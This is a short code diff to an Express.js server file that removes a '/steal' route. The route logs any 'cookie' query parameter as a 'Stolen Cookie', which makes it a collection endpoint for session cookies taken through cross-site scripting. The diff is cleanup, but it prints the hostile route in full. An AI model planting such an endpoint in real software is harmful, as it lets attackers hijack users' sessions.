@@ -41,11 +41,7 @@ app.use('/api', teachHistoryRoutes);
 app.use('/api', ticketRoutes);
 app.use('/api', authRoutes);
 app.use('/images', imageRoutes);
-app.get('/steal', (req, res) => {
-    const cookie = req.query.cookie;
-    console.log(`Stolen Cookie: ${cookie}`);
-    res.send('OK');
-});
+
 
 
 export default app;
